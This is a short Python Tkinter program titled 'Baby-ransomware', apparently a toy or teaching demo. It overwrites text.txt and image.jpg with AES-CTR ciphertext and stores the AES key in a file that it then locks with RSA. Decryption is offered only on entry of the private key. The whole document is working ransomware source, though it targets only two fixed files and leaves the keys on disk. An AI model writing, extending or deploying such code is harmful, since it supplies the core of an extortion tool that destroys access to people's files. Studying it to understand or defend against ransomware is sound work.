from email import message
from sys import exit
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP
import pyaes,  binascii, os, secrets
from tkinter import *


message1 = ""

keyPair = RSA.generate(2048)  # 2048 bit

pubKey = keyPair.publickey()
encryptor = PKCS1_OAEP.new(pubKey)
decryptor = PKCS1_OAEP.new(keyPair)

key = os.urandom(32)  #  32 bytes == 256 bits
iv = secrets.randbits(128) # 128 bits == 16 bytes 

def Encryption():
    et2.delete(0,END)
    print('{:^50}'.format('Encryption Suscess'))
    print("AES key :",key)
    print("IV :",iv)
    ciphertext=""
    with open('PublicKey_And_PrivateKey.txt', 'w+') as f:
        RSApub = format(f"RSA Public key:  (n={hex(pubKey.n)})")
        RSApri = format(f"RSA Private key: (d={hex(keyPair.d)})")
        s = f.write(RSApub)
        s = f.write("\n")
        s = f.write(RSApri)
        f.close()
    with open('text.txt', 'rb') as f:
        s = f.read()
        aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
        ciphertext = aes.encrypt(s)
        f.close()
    with open('text.txt', 'wb') as f:
        s = f.write(ciphertext)
        f.close()
    with open('image.jpg', 'rb') as f:
        s = f.read()
        aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
        ciphertext = aes.encrypt(s)
        f.close()
    with open('image.jpg', 'wb') as f:
        s = f.write(ciphertext)
        f.close()
    with open('LocalKey.txt', 'w+') as f:
        s = f.write("AES key :")
        s = f.write(str(key))
        s = f.write("\n")
        s = f.write("IV :")
        s = f.write(str(iv))
        f.close()
    with open('LocalKey.txt', 'rb') as f:
        s = f.read()
        ciphertext = encryptor.encrypt(s)
        f.close()
    with open('LocalKey.txt', 'wb') as f:
        s = f.write(ciphertext)
        f.close() 
    message1="Encryption Suscess"
    et2.insert(0,message1)
    
    
    
def Decryption():
    et2.delete(0,END)
    print('{:^50}'.format('Decryption Suscess'))
    paintext=""
    with open('text.txt', 'rb') as f:
        s = f.read()
        aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
        paintext = aes.decrypt(s)
        f.close()
    with open('text.txt', 'wb') as f:
        s = f.write(paintext)
        f.close()
    with open('image.jpg', 'rb') as f:
        s = f.read()
        aes = pyaes.AESModeOfOperationCTR(key, pyaes.Counter(iv))
        ciphertext = aes.decrypt(s)
        f.close()
    with open('image.jpg', 'wb') as f:
        s = f.write(ciphertext)
        f.close()

    message1="Decryption  Suscess"
    et2.insert(0,message1)
    

def Decryption_localkey():
    with open('LocalKey.txt', 'rb') as f:
        s = f.read()
        paintext = decryptor.decrypt(s)
        f.close()
    with open('LocalKey.txt', 'wb') as f:
        s = f.write(paintext)
        f.close()
    with open('LocalKey.txt', 'r') as f:
        s = f.read()
        print(s)
        f.close()

    

def Decryption_loc():
    et2.delete(0,END)
    pri = txt.get()
    message1 = ""
    if pri == str(hex(keyPair.d)):
        Decryption_localkey()
        message1="Decrtion Localkey Success"
        et2.insert(0,message1)
    else :
        message1="invalid input please enter again !"
        x=Label(text=message,font=20)
        et2.insert(0,message1)

#Tkinter Stuff
def Dele():
    txt.set("")
    et2.delete(0,END)
root=Tk()

root.title("Baby-ransomware")


Encryptionmes=Label(text="1. Encryption")
Encryptionmes.pack()
encrypt=Button(text="กดเพื่อ Encryption (เข้ารหัส)",command=Encryption)
encrypt.pack()

Decryptionmes=Label(text="2. Decryption")
Decryptionmes.pack()

decrypt=Button(text="กดเพื่อ Decryption (ถอดรหัส)",command=Decryption)
decrypt.pack()

Decryption_locm=Label(text="3. Decryption LocalKey  Please enter privatekey ")
Decryption_locm.pack()




txt=StringVar()
myText=Entry(root,textvariable=txt).pack()
Decry_local=Button(root,text="ถอดรหัส",command=Decryption_loc).pack()
Button(root,text="ล้างกล่อง",command=Dele).pack()


Label(text=" OUTPUT ").pack()
et2 =Entry(width=30,font=30)
et2.pack()


root.geometry("350x300")
root.mainloop()